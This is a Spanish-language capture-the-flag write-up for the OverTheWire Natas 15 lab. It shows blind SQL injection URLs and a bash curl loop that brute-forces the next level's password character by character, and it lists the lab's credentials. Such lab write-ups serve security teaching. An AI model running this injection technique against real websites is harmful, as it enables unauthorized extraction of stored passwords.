= OverTheWire Natas 15

== Resumen

OverTheWire es una página de retos informáticos enfocados en la seguridad por
parte de servidores web, sus retos están dividos en secciones dependiendo del
tipo de protocolo de conexión, las cuales son: Bandit, Leviathan, Natas,
Krypton, Narnia, Behemoth, Utumno y Maze.

== Solución

=== Escenario: Explotar vulnerabilidad

*Cuando* veo que utilizando un "matcher" de expresiones regulares proporcionado
por my_sql llamado *LIKE* se puede realizar este reto con facilidad y fuerza
de máquina

*Entonces* si se ingresa en la *URL* la siguiente inyección SQL, preguntando
si el carácter *0* existe en la contraseña:

[source, php]
----
natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
index.php?username=natas16" AND password LIKE BINARY "%0%" "
----

Un mensaje se muestra: "This user exists", es decir el caracter *0* si existe
en la contraseña

*Y* si se ingresa en la *URL* la siguiente inyección SQL, preguntando
si el carácter *1* existe en la contraseña:

[source, php]
----
natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
index.php?username=natas16" AND password LIKE BINARY "%1%" "
----

Un mensaje se muestra: "This user doesn't exist", es decir el caracter *1* no
existe en la contraseña

*Cuando* se sabe que la contraseña tiene las siguientes características:

1.Un tamaño 32 caracteres (como se ha visto en todas las contraseñas de
retos anteriores)

2.Utiliza un total de 62 caracteres, de la a-z, de la A-Z y 10 dígitos decimales

*Entonces* se procede a diseñar un programa para hacer fuerza bruta hasta
hallar la contraseña, el programa en bash queda de la siguiente manera:

_Se crea un diccionario con los 62 caracteres llamado DICC_
[source, bash]
----
DICC=('a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r'
      's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 'A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J'
      'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z' '0' '1'
      '2' '3' '4' '5' '6' '7' '8' '9');
----

_Se inicializa password como "string" vacío_

[source, bash]
----
password="";
----

_Se Implementa un doble bucle, el primero va a iterar hasta encontrar
los 32 caracteres de la contraseña, el segundo va a iterar en el diccionario de
los 72 caracteres, una vez encuentre un caracter que existe en la contraseña
en la posición dada se agrega ese caracter a password_

[source, bash]
----
for i in {1..32}; do
    for ch in "${DICC[@]}"; do
        curl -s http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@
        natas15.natas.labs.overthewire.org/index.php?username=
        natas16%22%20AND%20password%20LIKE%20BINARY%20%22$password$ch%%22%20%22
         2>/dev/null | grep "This user exists" > temp;
        query=$?

        if [[ $query == 0 ]] ; then
           password=$password$ch;
           break;
        fi
    done
echo $password;
done

echo "Hecho, la contraseña ha sido revelada"
----

*Entonces* solo bastará esperar a que el programa haga lo suyo, y la contraseña
será eventualmente revelada

== Link del reto - Credenciales

URL:  http://natas15.natas.labs.overthewire.org

Username: natas15

Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
